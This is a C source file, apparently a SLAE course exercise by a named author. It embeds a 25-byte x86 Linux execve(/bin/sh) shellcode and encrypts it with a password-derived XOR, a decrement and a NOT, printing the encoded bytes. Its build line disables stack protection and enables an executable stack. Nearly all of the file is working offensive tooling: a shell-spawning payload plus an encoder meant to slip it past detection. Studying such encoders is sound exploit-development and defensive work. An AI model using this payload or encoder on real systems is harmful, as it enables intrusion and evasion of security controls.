/*
Tested on       : Linux/x86
Author          : Elham AlShehri
ID              : SLAE-1538
Shellcode Size  : 25 bytes ( Null-free )
Description     : execve(/bin/sh)

Test Using:
        gcc -fno-stack-protector -z execstack encrypter.c -o encrypter -std=c99
        Usage: ./encrypter password
*/

#include <stdio.h>
#include <string.h>

unsigned char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void print(char *res, int len)
{
    for (int c = 0; c < len; c++)
        printf("\\x%02x", res[c] & 0xffU);
    printf("\n");
}
int generateXOR(unsigned char *key)
{
    int l1 = strlen(key);
    int xorKey = 0;
    for (int i = 0; i < l1; i++)
        xorKey ^= key[i];
    return xorKey;
}
void encrypt(int xorKey)
{
    int i;
    int l2 = strlen(shellcode);
	
    unsigned char cipher[l2];
    
    // 1. xor
    // check the result of xor is not 0
    for ( i = 0; i < l2; i++)
        cipher[i] = (shellcode[i] ^ xorKey)? shellcode[i] ^ xorKey : shellcode[i];

    // 2. dec
    for ( i = 0; i < l2; i++)
        cipher[i] = cipher[i] - 0x1;

    // 3. not
    for ( i = 0; i < l2; i++)
        cipher[i] = ~cipher[i];

    printf("[+] Encrypted shellcode %d bytes:\n" , l2);
    print(cipher, l2);
}
int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        printf("\tUsage: %s password\n", argv[0]);
        return 1;
    }
    char* key = argv[1];
    int xorKey = generateXOR(key);

    printf("[+] XOR key = \\x%02x\n", xorKey);
    encrypt(xorKey);
    return 0;
}